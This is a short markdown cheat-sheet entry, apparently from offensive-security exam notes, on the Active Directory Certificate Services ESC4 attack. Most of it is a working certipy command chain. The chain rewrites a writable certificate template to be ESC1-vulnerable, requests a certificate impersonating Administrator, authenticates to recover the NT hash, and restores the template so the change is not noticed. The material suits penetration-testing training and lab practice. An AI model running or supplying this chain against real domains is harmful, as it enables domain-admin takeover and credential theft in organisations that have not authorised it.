---
id: adcs-esc4
title: ADCS ESC4 — Writable Template ACL
stage: privesc
tags: [windows, ad]
tools:
  - "certipy template -u user@$DOMAIN -p password -dc-ip $DC_IP -template TargetTemplate -save-old"
  - "certipy template -u user@$DOMAIN -p password -dc-ip $DC_IP -template TargetTemplate -write-default-configuration"
  - "certipy req -u user@$DOMAIN -p password -dc-ip $DC_IP -ca CA-NAME -template TargetTemplate -upn Administrator@$DOMAIN"
leads_to:
  - adcs-esc1
  - domain-admin
  - dcsync
---

## Conditions

Your account or group has `Full Control`, `Write Owner`, or `Write DACL` on a certificate template. BloodHound will show this as an edge to the template object.

## Exploit Chain (ESC4 → ESC1)

```bash
# Step 1: Save current template config
certipy template -u user@$DOMAIN -p 'password' -dc-ip $DC_IP \
  -template 'TargetTemplate' -save-old

# Step 2: Overwrite template with ESC1-vulnerable config
certipy template -u user@$DOMAIN -p 'password' -dc-ip $DC_IP \
  -template 'TargetTemplate' -write-default-configuration

# Step 3: Request cert as Administrator
certipy req -u user@$DOMAIN -p 'password' -dc-ip $DC_IP \
  -ca 'CA-NAME' -template 'TargetTemplate' -upn Administrator@$DOMAIN

# Windows Server 2022 with StrongCertificateBindingEnforcement — add SID:
certipy req -u user@$DOMAIN -p 'password' -dc-ip $DC_IP \
  -ca 'CA-NAME' -template 'TargetTemplate' -upn Administrator@$DOMAIN \
  -sid S-1-5-21-...-500

# Step 4: Authenticate with cert → NT hash
certipy auth -pfx administrator.pfx -dc-ip $DC_IP

# Step 5: Restore template (clean up — important in exam scenarios)
certipy template -u user@$DOMAIN -p 'password' -dc-ip $DC_IP \
  -template 'TargetTemplate' -configuration TargetTemplate.json
```

## Notes

ESC4 is a two-step chain: overwrite template to make it ESC1-vulnerable, then exploit via ESC1. Always save the old template first and restore after — some exam graders check for clean environments.
